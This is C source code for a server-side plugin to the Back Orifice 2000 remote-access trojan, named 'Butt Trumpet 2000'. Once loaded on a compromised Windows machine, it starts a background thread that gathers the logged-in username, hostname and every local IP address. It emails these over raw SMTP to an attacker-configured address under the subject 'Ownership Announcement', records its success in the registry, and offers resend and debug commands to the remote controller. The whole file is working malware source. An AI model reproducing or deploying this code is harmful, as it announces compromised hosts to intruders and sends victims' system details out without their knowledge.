// Butt Trumpet 2000
//  Brian Enigma
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <sys/types.h>
#include <sys/timeb.h>
#include <bo2k/plugins.h>
#include <bo2k/bocomreg.h>
#include <bo2k/iohandler.h>
#include <bo2k/encryption.h>
#include <bo2k/config.h>
#include <bo2k/strhandle.h>
#include "BT2K.h"

#define DEBUG_STRING_SIZE		1024
#define REGISTRY_READ			0
#define REGISTRY_WRITE			1
#define REGISTRY_CLEAR			2
#define SMTP_PORT				25
#define MAX_LINE_SIZE			1024
#define MAX_NAME_SIZE			64

#define	VERIFY_RET_VAL( arg ) \
            { int nRet = arg; if( nRet ) return nRet; }

// Plugin Linkage Variables
CEncryptionHandler				*g_pEncHandler=NULL;
CIOHandler						*g_pIOHandler=NULL;
TYPEOF_RegisterCommand			*RegisterCommand=NULL;
TYPEOF_UnregisterCommand		*UnregisterCommand=NULL;
TYPEOF_RegisterClientMenu		*RegisterClientMenu=NULL;
TYPEOF_UnregisterClientMenu		*UnregisterClientMenu=NULL;
TYPEOF_IssueAuthCommandRequest	*IssueAuthCommandRequest=NULL;
TYPEOF_IssueAuthCommandReply	*IssueAuthCommandReply=NULL;
TYPEOF_ConnectAuthSocket		*ConnectAuthSocket=NULL;
TYPEOF_ListenAuthSocket			*ListenAuthSocket=NULL;
TYPEOF_InteractiveConnect		*InteractiveConnect=NULL;
TYPEOF_InteractiveListen		*InteractiveListen=NULL;

// Need this so that the configuration can be modified on the fly
#pragma comment(linker,"/section:.rdata,RW")
#pragma comment(linker,"/section:.data,RW")

// Global variables
HINSTANCE g_hInstance;
BOOL g_bActive;
long g_nNumThreads;
int g_nSampleCommand;						   

// Configuration string read by client,server and configuration tool
char g_szBT2KOptions[]="<**CFG**>Butt Trumpet 2000\0"
			             "S[64]:Mail Server=mail.hotmail.com\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
			             "S[64]:Destination EMail=user@hotmail.com\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
                         "B:Repeat Process=1\0"
			             "S[64]:Message=0wn3d!\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
static char g_szMailerID[]="X-Mailer: Back Orifice Butt Trumpet 2000\r\n";

// ------------- Function Implementations ------------------

BOOL WINAPI DllMain(HINSTANCE hInst, ULONG ul_reason_for_call, LPVOID lpReserved)
{
	// Do NOT perform configuration or initialization here
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		g_hInstance=hInst;
		break;
	}
	return TRUE;
}

// InstallPlugin is called on both the server side and the client side to
// pass in function addresses that the plugin can use.
// Some functions are only passed in by the client, and some only by the
// server. If they are not passed, in they are NULL.

BOOL InstallPlugin(PLUGIN_LINKAGE pl)
{
	WORD wVersionRequested = 0x0100;
	WSADATA sData;
	DWORD nThreadID;
	g_bActive=TRUE;
	g_nNumThreads=0;

	g_pEncHandler=pl.pEncryptionHandler;
	g_pIOHandler=pl.pIOHandler;
	RegisterCommand=pl.pRegisterCommand;
	UnregisterCommand=pl.pUnregisterCommand;
	IssueAuthCommandRequest=pl.pIssueAuthCommandRequest;
	IssueAuthCommandReply=pl.pIssueAuthCommandReply;
	ConnectAuthSocket=pl.pConnectAuthSocket;
	ListenAuthSocket=pl.pListenAuthSocket;
	RegisterClientMenu=pl.pRegisterClientMenu;
	UnregisterClientMenu=pl.pUnregisterClientMenu;
	InteractiveListen=pl.pInteractiveListen;
	InteractiveConnect=pl.pInteractiveConnect;
	
	// Deny client side operation
	if (RegisterClientMenu)
	{
		MessageBox(NULL, "Butt Trumpet 2000 is strictly a Server-Side plugin.", "BT2K", MB_ICONERROR);
		return FALSE;
	}

	// Server side command registration
	if(RegisterCommand) {
		g_pszDebugString = (char*)malloc(DEBUG_STRING_SIZE);
		//memset(g_pszDebugString, 0, DEBUG_STRING_SIZE);
		*g_pszDebugString = 0;
		g_szIPList[0] = 0;
		myIP(g_szIPList);
		WSAStartup(wVersionRequested, &sData);

		g_nDebugCommand=RegisterCommand(CmdProc_DebugCommand,"BO2K","Debug:Show",NULL,NULL,NULL);
		g_nDebugClearCommand=RegisterCommand(CmdProc_DebugClearCommand,"BO2K","Debug:Clear",NULL,NULL,NULL);
		g_nDebugResendCommand=RegisterCommand(CmdProc_DebugResendCommand,"BO2K","Debug:Resend Message",NULL,NULL,NULL);
	}

	debug("Starting worker thread");
	CreateThread(NULL, 0, btWorkerThread, 0, 0, &nThreadID);
	
	return TRUE;
}

// TerminatePlugin should wait for all threads spawned by the client or server
// to terminate, because the plugin DLL will be unloaded after this returns.

void TerminatePlugin(void)
{
	g_bActive=FALSE;
	debug("Waiting for worker thread to shut down");
	while(g_nNumThreads>0) Sleep(0);
	debug("Thread ended; exiting.");

	if(UnregisterCommand) {
		UnregisterCommand(g_nDebugCommand);
	}

}

BOOL PluginVersion(PLUGIN_VERSION *ppv)
{
	ppv->svFilename="bt2k.dll";
	ppv->svDescription="Butt Trumpet 2000";
	ppv->wVersionHi=0;
	ppv->wVersionLo=5;
	ppv->wBOVersionHi=1;
	ppv->wBOVersionLo=0;

	return TRUE;
}

////////////////////////////////////////////////////////////////////////////////////////
// Internal Functions

//----- debug -- Appends a string to our debug buffer.  While it is not quite
//      thread safe, it should be good enough for what we need to do here.
void debug(const char* msg)
{
	int size = DEBUG_STRING_SIZE - strlen(g_pszDebugString)-1;
	strncat(g_pszDebugString, msg, size);
	size = DEBUG_STRING_SIZE - strlen(g_pszDebugString)-1;
	strncat(g_pszDebugString, "\r\n", size);
}

//----- myIP -- enumerates through the local machine's IP network interfaces
//      and grabs each address.  They are stored in a preallocated buffer
//      passed into the function.  Be sure you have enough space, or bad
//      things may happen (Read: buffer overflows).  If there are more than
//      6 network interfaces in this machine (WOW!), then only the first
//      six are returned.
void myIP(char *result)
{
	char dot[6];
	int iResult;
	int i = 0;
	u_long *ppIpNO;
	u_long *pIpNO;
	HOSTENT FAR *lphostent;
	u_long ipHO;
	unsigned char binIp[4];
	int iterations = 0;

	//Get local host name and crudely validate
	char szHostName[40];
	*result = 0;
	iResult = gethostname(szHostName, sizeof(szHostName));
	if ((iResult != 0) || (lstrcmp(szHostName, "")==0))
		return;

	//Look up this host info via supplied name
	lphostent = gethostbyname(szHostName);
	if (lphostent == NULL)
		return;

	//Retreive first entry (might have multiple connects)
	do
	{
		iterations++;
		ppIpNO = (u_long *)lphostent->h_addr_list;
		if (ppIpNO+i == NULL)
			return;
		pIpNO = ((u_long *)*(ppIpNO+i));
		if (pIpNO == NULL)
			return;

	//convert back to host order, since SOCKADDR_IN expects that
		ipHO = ntohl(*pIpNO);

		binIp[0] = (BYTE)((ipHO & 0xff000000) >> 24);
		itoa(binIp[0], dot, 10);
		strcat(result,dot);
		binIp[1] = (BYTE)((ipHO & 0x00ff0000) >> 16);
		itoa(binIp[1], dot, 10);
		strcat(result, "."); strcat(result, dot);
		binIp[2] = (BYTE)((ipHO & 0x0000ff00) >> 8);
		itoa(binIp[2], dot, 10);
		strcat(result, "."); strcat(result, dot);
		binIp[3] = (BYTE)(ipHO & 0x000000ff);
		itoa(binIp[3], dot, 10);
		strcat(result,"."); strcat(result, dot);
		strcat(result,"\r\n");
		i++;
	} while ((pIpNO != NULL) && (iterations < 6));
	return;
}

//----- registryOperation -- does one of two things, based on mode:
// case REGISTRY_READ:
//   Reads the registry to see if an SMTP message has been successfully
//   sent in the past.  Returns a logical true or false.
// case REGISTRY_WRITE:
//   Writes into the registry that the SMTP message has been successfully
//   sent.  The return value of the function in this mode is undefined.
// case REGISTRY_CLEAR:
//   Clears from the registry the fact that the SMPT message has been
//   successfully sent.
int registryOperation(int mode)
{
	HKEY k;
	DWORD dispo;
	DWORD ran = 0;
	DWORD size = sizeof(ran);
	DWORD type;
	
	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, 
				   "SOFTWARE\\NinjaSoft\\BT2K",
				   0, NULL, REG_OPTION_NON_VOLATILE,
				   KEY_ALL_ACCESS, NULL, &k, &dispo)
		!= ERROR_SUCCESS)
		return 0;
	//ASSERT: Key is open and valid
	switch(mode)
	{
	case REGISTRY_READ:
		//Read the value.  If unsuccessful, it probably doesn't
		// exist, so poke a zero into our undefined variable.
		if (RegQueryValueEx(k, "RunSuccess", 0,	&type, (unsigned char *)&ran, &size)
			!= ERROR_SUCCESS)
			ran = 0;
		break;
	case REGISTRY_WRITE:
	case REGISTRY_CLEAR:
		if (mode==REGISTRY_WRITE) 
			ran = 1;
		RegSetValueEx(k, "RunSuccess", 0, REG_DWORD, (unsigned char *)&ran, sizeof(ran));
		ran = 0;
		break;
	default:
		ran = 0;
		break;
	}
	RegCloseKey(k);
	return ran;
}

//----- btWorkerThread -- Performs the real, hard-core action of this DLL.  Establishes
//      a connection with the mail server, sends the mail, etc.
DWORD WINAPI btWorkerThread(LPVOID lpParameter)
{
	const int secondsDelay = 10;
	char msg[17*6+1] = "";
	int i;

	if (g_nNumThreads>=1)
	{
		debug("Thread tried to start, but was already running");
		return 0;
	}
	g_nNumThreads++;
	debug("Thread started");
	//If we are set up to only run once, and if we have already
	//successfully run, then terminate the thread.
	if (!GetCfgBool(g_szBT2KOptions, "Repeat Process"))
	{
		if (registryOperation(REGISTRY_READ))
		{
			debug("Already ran; thread aborted");
			g_nNumThreads--;
			return 0;
		}
	}
	//Keep going until the server requests a DLL shutdown
	while (g_bActive)
	{
		if (announce()==0)
			break;
		//Wait "secondsDelay" seconds, checking for termination signal 
		// every half-second.
		for (i=0; i<secondsDelay*2; i++)
		{
			if (!g_bActive)
				break;
			Sleep(500);
		}
	}
	//Success!  Write it!
	registryOperation(REGISTRY_WRITE);
	debug("Thread terminated");
	g_nNumThreads--;
	return 0;
}

//----- announce -- Performs the SMTP communication
int announce(void)
{
	SOCKET				s;
	struct hostent*		pH;
	char*				szHost    = GetCfgStr(g_szBT2KOptions, "Mail Server");
	char*				szEMail   = GetCfgStr(g_szBT2KOptions, "Destination EMail");
	char*				szMessage = GetCfgStr(g_szBT2KOptions, "Message");
	char				szUserName[MAX_NAME_SIZE+1];
	char				szHostName[MAX_NAME_SIZE+1];
	char				szBuff[ MAX_LINE_SIZE + 1 ];
	DWORD				nSize = MAX_NAME_SIZE;
	struct sockaddr_in	addr;
	char				szTime[ MAX_NAME_SIZE + 1 ]; // time related vars
	time_t				tTime;
	struct tm*			ptm;
	struct timeb		tbTime;

	// Create the socket
	if( (s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET )
	{
		debug("Could not create socket");
		return WSAGetLastError();
	}

	//Resolve the mail host (is there an easy way to get the MX record
	//of the remote host?  That would make this code a little more
	//idiot proof.  "Why doesn't it work when I connect to Hotmail?"
	//"RTFM.  Use mail.hotmail.com" -- It would be so much easier if
	//I could just get the highest priority MX record and use that).
	if( isdigit(szHost[0]) && strchr(szHost, '.') )
		// ^^^ Gonna tweak on a host name beginning with a number.  Oh well.
		{
		unsigned long iaddr = inet_addr( szHost );
		pH = gethostbyaddr( (const char *)&iaddr, 4, PF_INET );
		}
	else
		pH = gethostbyname( szHost );
	if( pH == NULL ){
		debug("Could not resolve hostname");
		return WSAGetLastError();
	}

	addr.sin_family = AF_INET;
	addr.sin_port   = htons( SMTP_PORT );
	memcpy( &addr.sin_addr, pH->h_addr_list[0],
			sizeof(struct in_addr) );

	//Get Username
	GetUserName(szUserName, &nSize); nSize = MAX_NAME_SIZE;
	gethostname(szHostName, nSize);
	
	//Connect to the address
	if( connect(s, (struct sockaddr *)&addr, sizeof(struct sockaddr)) )
	{
		debug("Could not connect to mail host");
		return WSAGetLastError();
	}
	// receive signon message
	VERIFY_RET_VAL( Receive( s, szBuff, MAX_LINE_SIZE, 0, "220" ); );
	// send HELO message
	VERIFY_RET_VAL( Send( s, "HELO ", 5, 0 ); )
	VERIFY_RET_VAL( Send( s, szHostName, strlen(szHostName), 0 ); )
	VERIFY_RET_VAL( Send( s, "\r\n", 2, 0 ); )
	VERIFY_RET_VAL( Receive( s, szBuff, MAX_LINE_SIZE, 0, "250" ); )
	// send MAIL FROM message
	VERIFY_RET_VAL( Send( s, "MAIL FROM:", 10, 0 ); )
	VERIFY_RET_VAL( Send( s, szUserName, strlen(szUserName), 0 ); )
	VERIFY_RET_VAL( Send( s, "\r\n", 2, 0 ); )
	VERIFY_RET_VAL( Receive( s, szBuff, MAX_LINE_SIZE, 0, "250" ); )
	// send RCPT message
	VERIFY_RET_VAL( Send( s, "RCPT TO:", 8, 0 ); )
	VERIFY_RET_VAL( Send( s, szEMail, strlen(szEMail), 0 ); )
	VERIFY_RET_VAL( Send( s, "\r\n", 2, 0 ); )
	VERIFY_RET_VAL( Receive( s, szBuff, MAX_LINE_SIZE, 0, "25" ); )
	// send DATA message
	sprintf( szBuff, "DATA\r\n" );
	VERIFY_RET_VAL( Send( s, "DATA\r\n", 6, 0 ); )
	VERIFY_RET_VAL( Receive( s, szBuff, MAX_LINE_SIZE, 0, "354" ); )

	// construct date string
	tTime = time( NULL );
	ptm   = localtime( &tTime );
	strftime( szTime, MAX_NAME_SIZE, "%a, %d %b %Y %H:%M:%S %Z", ptm );
	// find time zone offset and correct for DST
	ftime( &tbTime );
	if( tbTime.dstflag )
		tbTime.timezone -= 60;
	sprintf( szTime + strlen(szTime), " %2.2d%2.2d",
			 -tbTime.timezone / 60, tbTime.timezone % 60 );
	// Date:
	VERIFY_RET_VAL( Send( s, "Date: ", 6, 0 ); )
	VERIFY_RET_VAL( Send( s, szTime, strlen(szTime), 0 ); )
	VERIFY_RET_VAL( Send( s, "\r\n", 2, 0 ); )
	// X-Mailer header:
	VERIFY_RET_VAL( Send( s, g_szMailerID, strlen(g_szMailerID), 0 ); )
	// To:
	VERIFY_RET_VAL( Send( s, "To: ", 4, 0 ); )
	VERIFY_RET_VAL( Send( s, szEMail, strlen(szEMail), 0 ); )
	VERIFY_RET_VAL( Send( s, "\r\n", 2, 0 ); )
	// From:
	sprintf( szBuff, "From: %s@%s\r\n", "ButtTrumpet", szHostName );
	VERIFY_RET_VAL( Send( s, "From: ButtTrumpet@", 18, 0 ); )
	VERIFY_RET_VAL( Send( s, szHostName, strlen(szHostName), 0 ); )
	VERIFY_RET_VAL( Send( s, "\r\n", 2, 0 ); )
	// Subject:
	VERIFY_RET_VAL( Send( s, "Subject: Ownership Announcement\r\n", 33, 0 ); )
	VERIFY_RET_VAL( Send( s, "\r\n", 2, 0 ); )
	// Message:
	VERIFY_RET_VAL( Send( s, szUserName, strlen(szUserName), 0 ); )
	VERIFY_RET_VAL( Send( s, "@", 1, 0 ); )
	VERIFY_RET_VAL( Send( s, szHostName, strlen(szHostName), 0 ); )
	VERIFY_RET_VAL( Send( s, "\r\n", 2, 0 ); )
	VERIFY_RET_VAL( Send( s, szTime, strlen(szTime), 0 ); )
	VERIFY_RET_VAL( Send( s, "\r\n", 2, 0 ); )
	VERIFY_RET_VAL( Send( s, szMessage, strlen(szMessage), 0 ); )
	VERIFY_RET_VAL( Send( s, "\r\n", 2, 0 ); )
	VERIFY_RET_VAL( Send( s, g_szIPList, strlen(g_szIPList), 0 ); )
	VERIFY_RET_VAL( Send( s, "\r\n\r\n", 4, 0 ); )

	// End message; check for result.
	VERIFY_RET_VAL( Send( s, "\r\n.\r\n", 5, 0 ); )
	VERIFY_RET_VAL( Receive( s, szBuff, MAX_LINE_SIZE, 0, "250" ); )
	
	// send QUIT message
	VERIFY_RET_VAL( Send( s, "QUIT\r\n", 6, 0 ); )
	VERIFY_RET_VAL( Receive( s, szBuff, MAX_LINE_SIZE, 0, "221" ); )
	debug("SUCCESS!:Message sent");

	closesocket( s );
	return 0;
}

//----- Send -- send the request to the SMTP server, block-by-block
//      to make sure it all gets there.  Handle errors.
int Send( SOCKET s, const char *lpszBuff, int nLen, int nFlags )
{
	int nCnt = 0;

	while( nCnt < nLen )
		{
		int nRes = send( s, lpszBuff + nCnt, nLen - nCnt, nFlags );
		if( nRes == SOCKET_ERROR )
			return WSAGetLastError();
		else
			nCnt += nRes;
		}

	return 0;
}

//----- Receive -- receive a reply from the SMTP server, and verify that
//      the request has succeeded by checking against the specified
//      reply code.
int Receive( SOCKET s, LPTSTR lpszBuff, int nLenMax, int nFlags,
			  LPCTSTR lpszReplyCode )
{
	LPTSTR p;
	int    nRes = recv( s, lpszBuff, nLenMax, nFlags );

	if( nRes == SOCKET_ERROR )
		return WSAGetLastError();
	else
		*( lpszBuff + nRes ) = '\0';


	// check reply code for success/failure
	p = strtok( lpszBuff, "\n" );
	while( p )
		{
		if( *(p + 3) == ' ' )
			{
			if( !strncmp(p, lpszReplyCode, strlen(lpszReplyCode)) )
				return 0;
			else
				{
				int nErr = 1;

				sscanf( p, "%d", &nErr );
				return -nErr;
				}
			}
		else
			p = strtok( NULL, "\n" );
		}

	return -1;
}

////////////////////////////////////////////////////////////////////////////////////////
// Exported Command Functions

//----- debugCommand -- Dumps the debug string to the end user, then clears the
//      buffer.
int CmdProc_DebugCommand(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	IssueAuthCommandReply(cas_from, comid, 0, "\r\nDebug:\r\nMy IP Addresses:\r\n");
	IssueAuthCommandReply(cas_from, comid, 0, g_szIPList);
	IssueAuthCommandReply(cas_from, comid, 0, g_pszDebugString);
	return 0;
}

int CmdProc_DebugClearCommand(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	IssueAuthCommandReply(cas_from, comid, 1, "Debug Log Erased\r\n");
	memset(g_pszDebugString, 0, DEBUG_STRING_SIZE);
	return 0;
}

int CmdProc_DebugResendCommand(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	DWORD nThreadID;

	IssueAuthCommandReply(cas_from, comid, 1, "Resetting \"sent\" bit\r\n");
	registryOperation(REGISTRY_CLEAR);	
	IssueAuthCommandReply(cas_from, comid, 1, "Spawning send thread\r\n");
	debug("Starting worker thread");
	CreateThread(NULL, 0, btWorkerThread, 0, 0, &nThreadID);
	return 0;
}
